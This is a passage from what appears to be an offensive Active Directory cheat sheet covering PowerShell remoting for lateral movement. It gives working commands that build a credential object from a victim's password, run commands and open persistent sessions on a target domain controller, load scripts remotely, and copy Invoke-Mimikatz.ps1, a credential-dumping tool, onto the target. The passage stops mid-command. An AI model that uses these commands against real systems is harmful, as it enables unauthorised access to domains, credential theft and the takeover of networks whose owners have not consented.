_Requires ‘CIFS’ and ‘HTTP’ SPNs. May also need the ‘WSMAN’ or ‘RPCSS’ SPNs (depending on OS version)_

```powershell
# Create credential to run as another user (not needed after e.g. Overpass-the-Hash)
# Leave out -Credential $Cred in the below commands to run as the current user instead
$SecPassword = ConvertTo-SecureString 'VictimUserPassword' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\targetuser', $SecPassword)

# Run a command remotely (can be used on multiple machines at once)
Invoke-Command -Credential $Cred -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname}

# Launch a session as another user (prompt for password instead, for use with e.g. RDP)
Enter-PsSession -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser

# Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session prompt
$sess = New-PsSession -Credential $Cred -ComputerName dc.targetdomain.com
Invoke-Command -Session $sess -FilePath c:\path\to\file.ps1
Enter-PsSession -Session $sess

# Copy files to or from an active PowerShell remoting session
Copy-Item -Path .\Invoke-Mimikatz.ps1 -ToSession $sess -Destination "C:\Users\public
```